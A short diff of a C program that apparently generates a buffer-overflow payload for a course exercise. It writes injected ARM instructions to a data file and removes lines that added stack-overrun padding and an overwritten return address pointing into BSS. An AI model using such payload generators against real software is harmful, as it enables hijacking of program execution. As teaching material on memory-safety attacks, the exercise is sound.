@@ -27,27 +27,15 @@ int main(void) {
     ldrInstr = MiniAssembler_ldr(0, aPlusAddress); 
     fwrite(&ldrInstr, sizeof(ldrInstr), 1, dataAplus);
 
-    /* Branch to printf */
+    /* Branch to printf to print using the x0 register*/
     blInstr = MiniAssembler_bl(printfAddress, 0x42006c);
     fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);
 
-    /* Branch back to main function after getName */
+    /* Branch back to main function after printf */
     blInstr = MiniAssembler_bl(0x40089c, printfAddress);
     fwrite(&blInstr, sizeof(blInstr), 1, dataAplus);
     
-    /* add padding to overrun the stack */
-    fprintf(dataAplus, "%s", "anganganganganganggg"); /* 20  characters */
     
-    /* write BSS address of adr instruction to file */
-   fprintf(dataAplus, "%c", 0x64);
-   fprintf(dataAplus, "%c", 0x00);
-   fprintf(dataAplus, "%c", 0x42);
-   fprintf(dataAplus, "%c", 0x00);
-   fprintf(dataAplus, "%c", 0x00);
-   fprintf(dataAplus, "%c", 0x00);
-   fprintf(dataAplus, "%c", 0x00);
-   fprintf(dataAplus, "%c", 0x00);
-
     /* Close the file */
     fclose(dataAplus);
     return 0;
